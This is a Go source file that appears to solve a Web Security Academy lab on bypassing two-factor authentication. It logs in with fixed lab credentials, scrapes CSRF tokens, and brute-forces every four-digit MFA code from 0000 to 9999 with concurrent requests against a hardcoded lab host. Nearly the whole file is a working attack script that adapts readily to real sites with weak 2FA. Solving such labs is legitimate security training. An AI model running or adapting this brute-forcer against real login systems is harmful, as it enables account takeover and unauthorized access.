package main

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"regexp"
	"strings"
)

func solve(hostname string) {
	/*
	   For each code from 0000 to 9999:
	    - GET /login -- asserts 200 and retrieve csrf token
	    - POST /login -- use csrf token from previous step, asserts 302 and retrieve session cookie
	    - GET /login2 -- use session cookie from previous step, asserts 200 and retrieve csrf token
	    - POST /login2 -- use csrf token from previous step, if 302 notify success, otherwise do not notify
	*/

	foundChannel := make(chan bool)
	done := make(chan bool)

	maxRoutines := 15 // Limits the number of routines to not overflow the number of sockets that can be open

	for i := 0; i < 10000; i += maxRoutines {
		for mfaCode := i; mfaCode < i + maxRoutines; mfaCode++ {
			mfaCodeAsString := fmt.Sprintf("%04d", mfaCode)
			go attemptFlow(hostname, mfaCodeAsString, foundChannel, done)
		}
		for mfaCode := i; mfaCode < i + maxRoutines; mfaCode++ {
			<- done
		}
	}
	<- foundChannel

}

func attemptFlow(hostname string, mfaCode string, foundChannel chan bool, done chan bool) {
	csrfToken, cookies := firstStep(hostname)
	log.Printf("CSRF Token from first step: %s", csrfToken)
	cookies = secondStep(hostname, csrfToken, cookies)
	log.Printf("Cookies from second step: %s", cookies)
	csrfToken = thirdStep(hostname, cookies)
	log.Printf("CSRF Token from third step: %s", csrfToken)
	isSuccessful := fourthStep(hostname, cookies, csrfToken, mfaCode)
	if isSuccessful {
		foundChannel <- true
	}
	done <- true
}

func firstStep(hostname string) (string, []*http.Cookie) {
	// GET /login -- asserts 200 and retrieve csrf token
	uri := fmt.Sprintf("%s/login", hostname)

	resp, err := http.Get(uri)
	if err != nil {
		log.Printf("Something not right when doing the request from the first step...")
		return "something", []*http.Cookie{}
	}

	defer resp.Body.Close()

	responseBody, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Printf("Something not right when processing the request from the first step...")
	}

	return findCsrfTokenInBody(string(responseBody)), resp.Cookies()
}

func secondStep(hostname string, csrfToken string, cookies []*http.Cookie) []*http.Cookie {
	// POST /login -- use csrf token from previous step, asserts 302 and retrieve session cookie
	uri := fmt.Sprintf("%s/login", hostname)
	data := url.Values{"csrf": {csrfToken}, "username": {"carlos"}, "password": {"montoya"}}

	req, err := http.NewRequest(http.MethodPost, uri, strings.NewReader(data.Encode()))
	if err != nil {
		log.Printf("Something not right when making the request from the second step...")
		return []*http.Cookie{}
	}

	for _, cookie := range cookies {
		req.AddCookie(cookie)
	}

	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	resp, err := client.Do(req)
	if err != nil {
		log.Printf("Something not right when doing the request from the second step...")
	}

	return resp.Cookies()
}

func thirdStep(hostname string, cookies []*http.Cookie) string {
	// GET /login2 -- use session cookie from previous step, asserts 200 and retrieve csrf token
	uri := fmt.Sprintf("%s/login2", hostname)

	req, err := http.NewRequest(http.MethodGet, uri, nil)

	if err != nil {
		log.Printf("Something not right when making the request from the third step...")
		return "something"
	}

	for _, cookie := range cookies {
		req.AddCookie(cookie)
	}

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		log.Printf("Something not right when doing the request from the third step...")
		return "something"
	}

	defer resp.Body.Close()

	responseBody, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Printf("Something not right when processing the request from the third step...")
	}

	return findCsrfTokenInBody(string(responseBody))
}

func fourthStep(hostname string, cookies []*http.Cookie, csrfToken string, mfaCode string) bool {
	// POST /login2 -- use csrf token from previous step, if 302 notify success, otherwise do not notify
	uri := fmt.Sprintf("%s/login2", hostname)
	data := url.Values{"csrf": {csrfToken}, "mfa-code": {mfaCode}}

	req, err := http.NewRequest(http.MethodPost, uri, strings.NewReader(data.Encode()))
	if err != nil {
		log.Printf("Something not right when making the request from the fourth step...")
		return false
	}

	for _, cookie := range cookies {
		req.AddCookie(cookie)
	}

	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	resp, err := client.Do(req)
	if err != nil {
		log.Printf("Something not right when doing the request from the fourth step...")
		return false
	}

	if resp.StatusCode == http.StatusFound {
		log.Printf("Use this csrfToken: %s - mfaCode: %s - cookies: %s", csrfToken, mfaCode, cookies)
		return true
	}

	log.Printf("Not today :sad: - StatusCode: %s", resp.Status)
	return false
}

func findCsrfTokenInBody(body string) string {
	rgx := regexp.MustCompile(`<input required type="hidden" name="csrf" value="(.*)">`)
	rs := rgx.FindStringSubmatch(body)

	return rs[1]
}

func main() {
	log.SetFlags(log.LstdFlags | log.Lmicroseconds)

	hardcodedHostname := "https://ac2f1fbe1e86329280a01063003c00ba.web-security-academy.net"
	solve(hardcodedHostname)
}
